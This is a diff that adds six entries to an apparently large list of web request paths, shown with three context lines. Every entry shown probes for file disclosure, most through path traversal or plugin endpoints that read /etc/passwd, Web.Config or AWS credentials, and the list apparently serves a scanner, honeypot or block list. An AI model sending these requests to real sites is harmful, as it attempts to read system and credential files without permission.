@@ -50286,3 +50286,9 @@ http://ifconfig.me/
 /pms?module=logging&file_name=../../../../../../../../../../../../../../../../../../etc/passwd&number_of_lines=1000
 /elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=../../../../../../../../../../../../../../../../../../etc/passwd
 /aws/credentials?profile=../../../../Users/Shared/Docker/credentials
+/wp-content/plugins/google-listings-and-ads/vendor/googleads/google-ads-php/scripts/print_php_information.php
+/etc/passwd?raw
+/__screenshot-error?file=/etc/passwd
+/api/BetterImageGallery/imagehandler?path=../../../Web.Config
+/wp-content/plugins/user-meta/views/debug.php
+/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
